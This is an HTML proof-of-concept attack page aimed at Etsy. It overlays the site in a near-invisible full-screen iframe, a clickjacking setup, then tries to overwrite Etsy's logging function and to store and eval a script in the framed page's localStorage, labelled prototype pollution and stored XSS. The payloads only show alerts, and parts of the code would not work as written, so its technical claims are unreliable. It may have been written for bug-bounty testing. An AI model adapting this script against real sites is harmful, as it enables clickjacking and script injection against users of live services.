<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta http-equiv="refresh" content="2;url=https://www.etsy.com">
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01; /* Invisible iframe */
            z-index: 9999;
        }
    </style>
</head>
<body>

    <script>
        // ** Step 1: Delay Before Injecting Exploit **
        setTimeout(() => {
            // Open an invisible iframe targeting Etsy
            let iframe = document.createElement("iframe");
            iframe.src = "https://www.etsy.com";
            iframe.sandbox = "allow-scripts allow-same-origin";
            document.body.appendChild(iframe);

            // Ensure iframe loads before executing the exploit
            iframe.onload = function() {
                let iwin = iframe.contentWindow;
                
                try {
                    // ** Step 2: Exploit Prototype Pollution **
                    iwin.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
                        alert("Prototype Pollution Exploited! Payload: " + payload);
                    };
                    iwin.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");

                    // ** Step 3: Inject & Auto-Execute Stored XSS via LocalStorage **
                    iwin.localStorage.setItem("xss_payload", "alert('Stored XSS Triggered!');");
                    const payload = iwin.localStorage.getItem("xss_payload");
                    if (payload) {
                        iwin.eval(payload); // Execute stored XSS
                    }
                } catch (e) {
                    console.log("Exploit failed:", e);
                }
            };
        }, 4000); // Delay exploit execution after redirection
    </script>

</body>
</html>
